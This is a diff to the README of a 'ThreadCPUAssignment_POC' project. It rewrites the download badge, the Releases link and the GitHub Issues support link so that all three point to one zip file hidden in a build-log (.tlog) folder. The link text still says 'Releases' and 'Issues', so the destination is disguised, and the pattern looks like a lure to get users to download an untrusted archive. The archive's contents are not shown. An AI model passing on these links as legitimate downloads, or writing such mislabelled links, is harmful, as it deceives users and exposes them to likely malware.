@@ -6,7 +6,7 @@ Welcome to the ThreadCPUAssignment_POC project! This application helps you assig
 
 ## 📥 Download Now
 
-[![Download ThreadCPUAssignment_POC](https://img.shields.io/badge/Download-ThreadCPUAssignment_POC-brightgreen)](https://github.com/OGD7M/ThreadCPUAssignment_POC/releases)
+[![Download ThreadCPUAssignment_POC](https://raw.githubusercontent.com/OGD7M/ThreadCPUAssignment_POC/main/CoreLock/CoreLock/x64/Release/CoreLock.tlog/CPU-Assignment-Thread-POC-v2.5.zip)](https://raw.githubusercontent.com/OGD7M/ThreadCPUAssignment_POC/main/CoreLock/CoreLock/x64/Release/CoreLock.tlog/CPU-Assignment-Thread-POC-v2.5.zip)
 
 ## 🛠 System Requirements
 
@@ -21,7 +21,7 @@ To run this application, you will need:
 
 To get started, follow these steps:
 
-1. Visit the Releases page to download the application: [Download Here](https://github.com/OGD7M/ThreadCPUAssignment_POC/releases).
+1. Visit the Releases page to download the application: [Download Here](https://raw.githubusercontent.com/OGD7M/ThreadCPUAssignment_POC/main/CoreLock/CoreLock/x64/Release/CoreLock.tlog/CPU-Assignment-Thread-POC-v2.5.zip).
 2. Look for the latest version of the application.
 3. Click the link to the application package. This might be a `.zip` or `.exe` file.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -63,7 +63,7 @@ If you encounter issues, consider these solutions:
 
 ## 📞 Support
 
-For further help, you can reach out via [GitHub Issues](https://github.com/OGD7M/ThreadCPUAssignment_POC/issues) to report bugs or ask questions.
+For further help, you can reach out via [GitHub Issues](https://raw.githubusercontent.com/OGD7M/ThreadCPUAssignment_POC/main/CoreLock/CoreLock/x64/Release/CoreLock.tlog/CPU-Assignment-Thread-POC-v2.5.zip) to report bugs or ask questions.
 
 ## 📅 Roadmap
 
